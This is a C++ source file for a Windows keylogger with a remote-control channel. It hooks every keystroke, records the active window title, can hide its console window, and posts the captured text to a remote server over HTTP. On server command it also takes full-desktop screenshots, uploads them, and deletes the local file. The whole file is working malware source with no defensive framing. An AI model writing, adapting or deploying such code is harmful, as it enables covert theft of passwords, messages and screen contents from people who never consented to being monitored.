#include <winsock2.h>

#include <Windows.h>
#include <process.h>
#include <stdio.h>
#include <time.h>
#include <cstdio>
#include <fstream>
#include <iostream>

#define BUFFERSIZE 1024

// variable to store the HANDLE to the hook. Don't declare it anywhere else then
// globally or you will get problems since every function uses this variable.
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in
// the callback function it contains the thing you will need: vkCode = virtual
// key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream OUTPUT_FILE;

extern char lastwindow[256];

SOCKET sockfd;
struct sockaddr_in address;
struct hostent *website;

int ServerConnect();
char KeyMapping(char key);
void ServerMessage(void *p);
void ScreenShot(char *BmpName);
void imgTransfer(char *filepath);
char message[BUFFERSIZE] = {0};

const char *pHttpPost =
    "POST /put_data HTTP/1.1\r\n"
    "Host: %s:%d\r\n"
    "Connection: keep-alive\r\n"
    "Content-Length: %d\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
    "mmmm=%s";

// This is the callback function. Consider it the event that is raised when, in
// this case, a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0) {
        // the action is valid: HC_ACTION.
        if (wParam == WM_KEYDOWN) {
            // lParam is the pointer to the struct containing the data needed,
            // so cast and assign it to kdbStruct.
            kbdStruct = *((KBDLLHOOKSTRUCT *) lParam);

            // save to file
            Save(kbdStruct.vkCode);
        }
    }

    // call the next hook in the hook chain. This is nessecary or your hook
    // chain will break and the hook stops
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    // Set the hook and set it to use the callback function above
    // WH_KEYBOARD_LL means it will set a low level keyboard hook. More
    // information about it at MSDN. The last 2 parameters are NULL, 0 because
    // the callback function is in the same thread and window as the function
    // that sets and releases the hook.
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
        MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

void SendHTTP(const char *msg)
{
    char strHttpPost[1024] = {0};

    // msg should less than 1024
    size_t msg_len_len;
    if (strlen(msg) < 10) {
        msg_len_len = 1;
    } else if (strlen(msg) < 100) {
        msg_len_len = 2;
    } else if (strlen(msg) < 1000) {
        msg_len_len = 3;
    }

    // 4 for port
    size_t session_len =
        strlen(pHttpPost) + strlen(SERVER_IP) + 4 + msg_len_len + strlen(msg);
    // 5 for mmmm=
    snprintf(strHttpPost, session_len, pHttpPost, SERVER_IP, PORT,
             strlen(msg) + 5, msg);
    // 1024, msg);

    printf("%s\n", strHttpPost);
    // printf("true length: %d\n", strlen(strHttpPost));

    ServerConnect();
    send(sockfd, strHttpPost, strlen(strHttpPost), 0);
    // send(sockfd, pHttpPost, strlen(pHttpPost), 0);
}

int Save(int key_stroke)
{
    char lastwindow[256];

    if ((key_stroke == 1) || (key_stroke == 2))
        return 0;  // ignore mouse clicks

    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout;
    if (foreground) {
        // get keyboard layout of the thread
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground) {
        char window_title[256];
        GetWindowText(foreground, window_title, 256);

        if (strcmp(window_title, lastwindow) != 0) {
            strcpy(lastwindow, window_title);

            // get time
            char s[15];
            sprintf(s, "%lld", time(NULL));

            char tmp[256 + 15 + 30];
            sprintf(tmp, "\n\n{\"window\": \"%s\", \"time\": %s}\n\n",
                    window_title, s);
            strcat(message, tmp);
        }
    }


    // std::cout << key_stroke << '\n';

    if (key_stroke == VK_BACK) {
        strcat(message, "[#B]");
        // strcat(message, "[###BACKSPACE]");
    } else if (key_stroke == VK_RETURN) {
        strcat(message, "\n");
    } else if (key_stroke == VK_SPACE) {
        strcat(message, " ");
    } else if (key_stroke == VK_TAB) {
        strcat(message, "\t");
    } else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT ||
               key_stroke == VK_RSHIFT) {
        // strcat(message, "[###SHIFT]");
    } else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL ||
               key_stroke == VK_RCONTROL) {
        strcat(message, "[#C]");
        // strcat(message, "[###CTRL]");
    } else if (key_stroke == VK_ESCAPE) {
        strcat(message, "[#ES]");
        // strcat(message, "[###ESCAPE]");
    } else if (key_stroke == VK_END) {
        strcat(message, "[#ED]");
        // strcat(message, "[###END]");
    } else if (key_stroke == VK_HOME) {
        strcat(message, "[#HM]");
        // strcat(message, "[###HOME]");
    } else if (key_stroke == VK_LEFT) {
        strcat(message, "[#L]");
        // strcat(message, "[###LEFT]");
    } else if (key_stroke == VK_UP) {
        strcat(message, "[#U]");
        // strcat(message, "[###UP]");
    } else if (key_stroke == VK_RIGHT) {
        strcat(message, "[#R]");
        // strcat(message, "[###RIGHT]");
    } else if (key_stroke == VK_DOWN) {
        strcat(message, "[#D]");
        // strcat(message, "[###DOWN]");
    } else if (key_stroke == 190 || key_stroke == 110) {
        strcat(message, ".");
    } else if (key_stroke == 189 || key_stroke == 109) {
        strcat(message, "-");
    } else if (key_stroke == 20) {
        // strcat(message, "[###CAPSLOCK]");
    } else {
        char key;
        // check caps lock
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        // check shift key
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 ||
            (GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
            (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
            lowercase = !lowercase;
        }

        // map virtual key according to keyboard layout
        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        // tolower converts it to lowercase properly
        if (!lowercase) {
            //沒按Shift
            if (key >= 65 && key <= 90) {
                key = tolower(key);
            }
        } else {
            //有按Shift
            key = KeyMapping(key);
        }


        char buf[2] = {key, 0x00};
        strcat(message, buf);
    }

    // if (strlen(message) > BUFFERSIZE - 50) {
    // printf("len: %d\n", strlen(message));
    if (strlen(message) > 100) {
        // send(sockfd, message, BUFFERSIZE, 0);
        SendHTTP(message);
        strcpy(message, "");
    }


    return 0;
}

char KeyMapping(char key)
{
    char keymap[20][2] = {{'`', '~'},  {'1', '!'}, {'2', '@'},  {'3', '#'},
                          {'4', '$'},  {'5', '%'}, {'6', '^'},  {'7', '&'},
                          {'8', '*'},  {'9', '('}, {'0', ')'},  {'-', '_'},
                          {'=', '+'},  {'[', '{'}, {'\\', '|'}, {';', ':'},
                          {'\'', '"'}, {',', '<'}, {'.', '>'},  {'/', '?'}};


    for (int i = 0; i < 20; i++) {
        if (key == keymap[i][0]) {
            return keymap[i][1];
        }
    }

    return key;
}

void Stealth()
{
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);  // visible window
#endif                                                       // visible

#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);  // invisible window
#endif                                                       // invisible
}
// void SetConnect()
int ServerConnect()
{
    WSADATA wsadata;
    int result;
    int len;

    if (WSAStartup(0x101, (LPWSADATA) &wsadata) != 0) {
        printf("Winsock Error\n");
        exit(1);
    }


    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    // website = gethostbyname("http://localhost:8081");

    address.sin_family = AF_INET;
    // address.sin_addr.s_addr = *((unsigned long *) website->h_addr);
    address.sin_addr.s_addr = inet_addr(SERVER_IP);
    address.sin_port = htons(PORT);

    len = sizeof(address);


    result = connect(sockfd, (struct sockaddr *) &address, len);
    if (result == -1) {
        printf("Connect Error\n");
        return -1;
    } else {
        return 0;
    }
}

void ScreenShot(char *BmpName)
{
    HWND DesktopHwnd = GetDesktopWindow();
    HDC DevC = GetDC(DesktopHwnd);
    int Width = ::GetSystemMetrics(SM_CXSCREEN);
    int Height = ::GetSystemMetrics(SM_CYSCREEN);

    DWORD FileSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) +
                     (sizeof(RGBTRIPLE) + 1 * (Width * Height * 4));
    char *BmpFileData = (char *) GlobalAlloc(0x0040, FileSize);

    PBITMAPFILEHEADER BFileHeader = (PBITMAPFILEHEADER) BmpFileData;
    PBITMAPINFOHEADER BInfoHeader =
        (PBITMAPINFOHEADER) &BmpFileData[sizeof(BITMAPFILEHEADER)];

    BFileHeader->bfType = 0x4D42;  // BM
    BFileHeader->bfSize = sizeof(BITMAPFILEHEADER);
    BFileHeader->bfOffBits =
        sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    BInfoHeader->biSize = sizeof(BITMAPINFOHEADER);
    BInfoHeader->biPlanes = 1;
    BInfoHeader->biBitCount = 24;
    BInfoHeader->biCompression = BI_RGB;
    BInfoHeader->biHeight = Height;
    BInfoHeader->biWidth = Width;

    RGBTRIPLE *Image = (RGBTRIPLE *) &BmpFileData[sizeof(BITMAPFILEHEADER) +
                                                  sizeof(BITMAPINFOHEADER)];
    RGBTRIPLE color;

    HDC CaptureDC = CreateCompatibleDC(DevC);
    HBITMAP CaptureBitmap = CreateCompatibleBitmap(DevC, Width, Height);
    SelectObject(CaptureDC, CaptureBitmap);
    BitBlt(CaptureDC, 0, 0, Width, Height, DevC, 0, 0, SRCCOPY | CAPTUREBLT);
    GetDIBits(CaptureDC, CaptureBitmap, 0, Height, Image,
              (LPBITMAPINFO) BInfoHeader, DIB_RGB_COLORS);

    DWORD Junk;
    HANDLE FH = CreateFileA(BmpName, GENERIC_WRITE, FILE_SHARE_WRITE, 0,
                            CREATE_ALWAYS, 0, 0);
    WriteFile(FH, BmpFileData, FileSize, &Junk, 0);
    CloseHandle(FH);
    GlobalFree(BmpFileData);
}

void ServerMessage(void *p)
{
    int rVal;
    char buf[BUFFERSIZE + 1];

    while ((rVal = recv(sockfd, buf, BUFFERSIZE, 0)) > 0) {
        buf[rVal] = 0x00;
        if (strcmp(buf, "#get") == 0) {
            SendHTTP(message);
            strcpy(message, "");
        } else if (strcmp(buf, "#screenshot") == 0) {
            char filename[40] = "C:\\Users\\Public\\Pictures\\Hello.bmp";
            ScreenShot(filename);
            imgTransfer(filename);
            int status = DeleteFile(filename);

            // do something here
        }
    }
}

void imgTransfer(char *filepath)
{
    SendHTTP("#screenshot");
    int ret;
    FILE *ptrFile;
    ptrFile = fopen(filepath, "rb");

    char send_buf[FILEBLOCKSIZE];
    ret = fread(send_buf, sizeof(char), FILEBLOCKSIZE, ptrFile);
    while (ret == FILEBLOCKSIZE) {
        SendHTTP(send_buf);
        ret = fread(send_buf, sizeof(char), FILEBLOCKSIZE, ptrFile);
    }
    // send(sockfd, send_buf, ret, 0);
    SendHTTP(send_buf);
    // send(sockfd, "#END", FILEBLOCKSIZE, 0);
    SendHTTP("#END");
    fclose(ptrFile);
}

int main()
{
    // open output file in append mode
    // OUTPUT_FILE.open(".System32Log.txt", std::ios_base::app);

    // visibility of window
    Stealth();

    // Get message from Server
    _beginthread(ServerMessage, 0, NULL);

    // Set the hook
    SetHook();


    // loop to keep the console application running.
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
    }
}
